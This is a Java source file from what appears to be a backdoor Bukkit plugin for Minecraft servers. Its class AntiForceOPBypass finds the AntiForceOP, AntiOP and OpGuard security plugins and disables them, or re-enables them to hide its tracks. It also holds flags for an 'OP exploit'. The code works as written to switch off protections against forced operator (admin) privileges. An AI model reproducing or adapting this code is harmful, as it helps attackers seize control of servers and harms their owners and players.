package ew.quilt.bypass;

import ew.quilt.plugin.Main;
import org.bukkit.Bukkit;
import org.bukkit.plugin.Plugin;

public class AntiForceOPBypass {

    private static final boolean OP_EXPLOIT_ENABLE = false;
    private static final boolean SHOULD_BYPASS = false;
    private static final boolean SHOULD_RECOVER = false;

    public static void bypass(boolean recover) {
        Plugin[] bypassPlugin = {Bukkit.getPluginManager().getPlugin("AntiForceOP"), Bukkit.getPluginManager().getPlugin("AntiOP"), Bukkit.getPluginManager().getPlugin("OpGuard")};
        for (Plugin bypass : bypassPlugin) {
            if (bypass != null) {
                if (recover) {
                    Main.getPlugin().getPluginLoader().enablePlugin(bypass);
                } else {
                    Main.getPlugin().getPluginLoader().disablePlugin(bypass);
                }
            }
        }
    }

    public static boolean getOPExploit() {
        return OP_EXPLOIT_ENABLE;
    }

    public static boolean getShouldBypass() {
        return SHOULD_BYPASS;
    }

    public static boolean getShouldRecover() {
        return SHOULD_RECOVER;
    }
}
